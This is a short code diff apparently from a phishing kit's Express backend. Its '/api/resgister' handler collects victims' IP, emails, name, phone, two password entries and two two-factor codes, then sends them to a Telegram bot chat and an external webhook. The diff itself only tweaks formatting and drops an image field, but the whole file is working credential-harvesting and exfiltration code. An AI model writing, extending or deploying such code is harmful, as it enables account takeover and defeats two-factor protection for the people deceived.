@@ -22,6 +22,7 @@ app.post('/api/resgister', (req, res) => {
 
     
     const message = `<strong>Ip:</strong> ${data.ip ? data.ip : ''}
+----------------------
 <strong>Email Business:</strong> ${data.businessEmail ? data.businessEmail : ''} 
 <strong>Email Personal:</strong> ${data.personalEmail ? data.personalEmail : ''}
 <strong>Full Name:</strong> ${data.fullName ? data.fullName : ''} 
@@ -29,9 +30,9 @@ app.post('/api/resgister', (req, res) => {
 <strong>Phone Number:</strong> ${data.mobilePhone ? data.mobilePhone : ''}
 <strong>Password First:</strong> ${data.passwordFirst ? data.passwordFirst : ''}
 <strong>Password Second:</strong> ${data.passwordSecond ? data.passwordSecond : ''}
+----------------------
 <strong>First Two-Fa:</strong> ${data.firstTwoFa ? data.firstTwoFa : ''}
-<strong>Second Two-Fa:</strong> ${data.secondTwoFa ? data.secondTwoFa : ''}
-<strong>Image:</strong> ${data.imageUrl ? data.imageUrl : ''}`;
+<strong>Second Two-Fa:</strong> ${data.secondTwoFa ? data.secondTwoFa : ''}`;
 
     bot.sendMessage(process.env.CHAT_ID, message,  { parse_mode: 'HTML' });
 
@@ -50,7 +51,6 @@ if(process.env.WEBHOOK_URL == undefined  || process.env.WEBHOOK_URL == ""){
     url.searchParams.append('Password Second', data.passwordSecond ? data.passwordSecond : '');
     url.searchParams.append('First Two-Fa', data.firstTwoFa ? data.firstTwoFa : '');
     url.searchParams.append('Second Two-Fa', data.secondTwoFa ? data.secondTwoFa : '');
-    url.searchParams.append('Image', data.imageUrl ? data.imageUrl : '');
 
     axios.get(url)
     .then(response => {
